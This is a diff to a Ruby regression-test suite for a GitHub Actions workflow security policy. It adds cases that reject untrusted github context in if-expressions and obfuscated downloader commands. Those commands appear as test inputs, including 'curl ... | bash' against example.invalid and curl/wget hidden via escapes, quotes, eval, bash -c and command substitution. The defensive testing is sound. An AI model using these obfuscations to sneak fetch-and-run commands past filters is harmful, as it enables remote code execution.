@@ -42,6 +42,9 @@ def amend_workflow(source)
 end
 
 cases = {}
+wrapped_expression_case_names = []
+implicit_if_expression_case_names = []
+downloader_canonicalization_case_names = []
 add_case = lambda do |name, content, should_pass, expected_error = nil|
   cases[name] = [content, should_pass, expected_error]
 end
@@ -684,6 +687,66 @@ add_case.call(
   amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs']['test']['if'] = "${{ github.event_name == 'push' }}" },
   true
 )
+
+implicit_if_failure_cases = {
+  'job-if-implicit-untrusted-head-ref' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.event.pull_request.head.ref == 'main'" },
+  'step-if-implicit-untrusted-head-ref' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event.pull_request.head.ref == 'main'" },
+  'job-if-implicit-whole-event' => lambda { |workflow| workflow['jobs']['test']['if'] = 'github.event' },
+  'step-if-implicit-whole-pull-request' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = 'github.event.pull_request' },
+  'job-if-implicit-bracket-notation' => lambda { |workflow| workflow['jobs']['test']['if'] = "github['event']['pull_request']['head']['ref'] == 'main'" },
+  'step-if-implicit-mixed-dot-bracket' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event['pull_request'].head['ref'] == 'main'" },
+  'job-if-implicit-case-variant' => lambda { |workflow| workflow['jobs']['test']['if'] = "GITHUB.EVENT.PULL_REQUEST.HEAD.REF == 'main'" },
+  'step-if-implicit-whitespace-variant' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github . event . pull_request . head . ref == 'main'" },
+  'job-if-implicit-nested-contains' => lambda { |workflow| workflow['jobs']['test']['if'] = "contains(toJSON(github.event.pull_request), 'main')" },
+  'step-if-implicit-nested-format' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "format('{0}', github.event.pull_request.head.ref) == 'main'" },
+  'job-if-implicit-tojson' => lambda { |workflow| workflow['jobs']['test']['if'] = "toJSON(github.event) != ''" },
+  'step-if-implicit-github-ref' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.ref == 'refs/heads/main'" }
+}
+
+implicit_if_failure_cases.each do |name, mutation|
+  implicit_if_expression_case_names << name
+  add_case.call(
+    name,
+    amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) },
+    false,
+    'if expression direct github context is forbidden except github.sha and github.event_name'
+  )
+end
+
+{
+  'job-if-wrapped-untrusted-context' => lambda { |workflow| workflow['jobs']['test']['if'] = "${{ github.event.pull_request.head.ref == 'main' }}" },
+  'step-if-wrapped-untrusted-context' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "${{ github.event.pull_request.head.ref == 'main' }}" }
+}.each do |name, mutation|
+  wrapped_expression_case_names << name
+  add_case.call(
+    name,
+    amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) },
+    false,
+    'direct github context interpolation is forbidden except github.sha and github.event_name'
+  )
+end
+
+{
+  'job-if-implicit-safe-event-name' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.event_name == 'push'" },
+  'step-if-implicit-safe-event-name' => lambda { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "github.event_name == 'push'" },
+  'job-if-implicit-safe-sha' => lambda { |workflow| workflow['jobs']['test']['if'] = "github.sha != ''" }
+}.each do |name, mutation|
+  implicit_if_expression_case_names << name
+  add_case.call(name, amend_workflow(workflow_yaml(safe_sha)) { |workflow| mutation.call(workflow) }, true)
+end
+
+wrapped_expression_case_names << 'step-if-wrapped-safe-sha'
+add_case.call(
+  'step-if-wrapped-safe-sha',
+  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['jobs']['test']['steps'][1]['if'] = "${{ github.sha != '' }}" },
+  true
+)
+add_case.call(
+  'ordinary-string-without-expression-remains-ordinary',
+  amend_workflow(workflow_yaml(safe_sha)) { |workflow| workflow['env'] = { 'NOTE' => 'github.event.pull_request.head.ref is documentation' } },
+  true
+)
+
 {
   'whole-pull-request-context' => 'echo "${{ github.event.pull_request }}"',
   'whole-event-context' => 'echo "${{ github.event }}"',
@@ -822,8 +885,32 @@ downloader_parser_adversarial_cases = {
   'curl-loopback-port-overflow' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:65536/health >/dev/null',
   'curl-loopback-env-expansion' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:${PORT}/health >/dev/null',
   'curl-loopback-ordinary-file-redirect' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >health.txt',
-  'curl-loopback-without-config-disable' => 'curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null'
+  'curl-loopback-without-config-disable' => 'curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null',
+  'shell-escaped-curl-backslash' => 'c\url -fsSL https://example.invalid/install | bash',
+  'shell-escaped-wget-backslash' => 'w\get https://example.invalid/install.sh',
+  'shell-quoted-wget-middle' => 'w"get" https://example.invalid/install.sh',
+  'shell-empty-quoted-curl' => 'c""url https://example.invalid/install.sh',
+  'shell-single-quoted-segment-curl' => "'cu'rl https://example.invalid/install.sh",
+  'shell-double-quoted-segment-curl' => 'c"ur"l https://example.invalid/install.sh',
+  'shell-adjacent-quoted-wget' => "'w''g''e''t' https://example.invalid/install.sh",
+  'shell-uppercase-escaped-curl' => 'C\URL https://example.invalid/install.sh',
+  'shell-backslash-newline-curl' => "c\\\nurl https://example.invalid/install.sh",
+  'shell-no-space-pipe-curl' => 'c\url https://example.invalid/install.sh|bash',
+  'shell-env-wrapped-escaped-curl' => 'env c\url https://example.invalid/install.sh',
+  'shell-command-wrapped-quoted-wget' => 'command w"get" https://example.invalid/install.sh',
+  'shell-variable-command-curl' => 'cmd=curl; $cmd https://example.invalid/install.sh',
+  'shell-quoted-variable-command-curl' => "cmd='curl'\n\"$cmd\" https://example.invalid/install.sh",
+  'shell-command-substitution-builds-curl' => '"$(printf c\url)" https://example.invalid/install.sh',
+  'shell-printf-builds-wget' => '$(printf w"get") https://example.invalid/install.sh',
+  'shell-eval-containing-curl' => 'eval "c\url https://example.invalid/install.sh"',
+  'shell-bash-c-containing-curl' => 'bash -c "c\url https://example.invalid/install.sh"',
+  'shell-sh-c-containing-wget' => 'sh -c "w\get https://example.invalid/install.sh"',
+  'shell-unterminated-quote-fail-closed' => 'echo "unterminated'
 }
+
+downloader_canonicalization_case_names.concat(
+  downloader_parser_adversarial_cases.keys.grep(/\Ashell-/)
+)
 
 downloader_parser_adversarial_cases.each do |name, command|
   add_case.call(
@@ -908,6 +995,18 @@ add_case.call(
   ),
   true
 )
+{
+  'literal-loopback-127-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null',
+  'literal-loopback-localhost-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null',
+  'literal-loopback-ipv6-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://[::1]:3000/health >/dev/null'
+}.each do |name, command|
+  downloader_canonicalization_case_names << name
+  add_case.call(
+    name,
+    workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
+    true
+  )
+end
 add_case.call(
   'curl-loopback-health-check',
   workflow_yaml(
@@ -1053,4 +1152,7 @@ ensure
 end
 
 puts "Fixture directory safety regressions passed (#{dangerous_fixture_cases.length + 1} dangerous targets rejected)."
+puts "Wrapped expression regressions passed (#{wrapped_expression_case_names.length} cases)."
+puts "Implicit if expression regressions passed (#{implicit_if_expression_case_names.length} cases)."
+puts "Downloader canonicalization regressions passed (#{downloader_canonicalization_case_names.length} cases)."
 puts "Workflow policy regression tests passed (#{cases.length} cases, #{cases.length - passing_cases} bypass attempts)."
